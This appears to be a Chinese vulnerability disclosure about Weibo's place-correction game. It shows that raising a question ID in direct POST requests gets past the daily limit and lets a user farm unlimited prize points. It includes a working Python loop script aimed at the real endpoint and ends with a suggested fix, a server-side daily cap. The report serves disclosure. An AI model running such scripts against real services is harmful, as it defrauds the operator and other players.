简要描述：

据说周积分前五可以换奖品哦~

详细说明：

http://place.weibo.com/poigame

这个地点纠错游戏，抓个包，然后递增answers[0][qid]就可以无限刷积分了。

貌似前台一天有限制，但是如果是直接POST的话可以无视这个限制。。。



开了一小会，就那么多了。









漏洞证明：

# -*- coding: cp936 -*-

import urllib2

x=int(160420)

while True:

    p=urllib2.Request('http://place.weibo.com/index.php?_p=ajax&_a=exame&action=answer')

    p.add_header('Cookie','[Your Cookie]')

    p.add_data('num=1&answers%5B0%5D%5Bqid%5D='+str(x)+'&answers%5B0%5D%5Bqtype%5D=duplicate&answers%5B0%5D%5Bqabstract%5D%5Bpoiid1%5D=1007176637&answers%5B0%5D%5Bqabstract%5D%5Bpoiid2%5D=1007170929&answers%5B0%5D%5Bresult%5D=no')

    response = urllib2.urlopen(p)

    x=x+1

    print x

    response.close()





修复方案：

限制次数，在接口处限制一天最多可以参加多少次！
